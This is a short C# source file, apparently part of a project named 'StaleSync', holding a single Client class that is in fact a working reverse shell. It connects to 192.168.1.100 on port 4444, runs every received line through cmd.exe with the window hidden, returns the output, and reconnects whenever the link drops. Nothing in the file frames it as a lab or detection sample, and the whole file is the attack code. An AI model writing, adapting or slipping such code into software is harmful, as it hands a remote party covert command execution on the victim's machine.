using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System;
using System.Threading;

namespace StaleSync.Core
{
    public static class Client
    {
        public static void Start()
        {
            var serverIP = "192.168.1.100";
            var port = 4444;
            var reconnectDelay = 2000;

            while (true)
            {
                try
                {
                    Console.WriteLine("Attempting to connect...");
                    using var client = new TcpClient(serverIP, port);
                    using var stream = client.GetStream();
                    using var reader = new StreamReader(stream);
                    using var writer = new StreamWriter(stream);
                    writer.AutoFlush = true;
                    Console.WriteLine("Connected to server!");

                    string command;
                    while ((command = reader.ReadLine()) != null)
                    {
                        var process = new Process();
                        process.StartInfo.FileName = "cmd.exe";
                        process.StartInfo.Arguments = "/c " + command;
                        process.StartInfo.RedirectStandardOutput = true;
                        process.StartInfo.RedirectStandardError = true;
                        process.StartInfo.UseShellExecute = false;
                        process.StartInfo.CreateNoWindow = true;
                        process.Start();

                        var output = process.StandardOutput.ReadToEnd() + process.StandardError.ReadToEnd();
                        writer.WriteLine(output);
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Connection lost: " + ex.Message);
                    Console.WriteLine($"Reconnecting in {reconnectDelay / 1000} seconds...");
                    Thread.Sleep(reconnectDelay);
                }
            }
        }
    }
}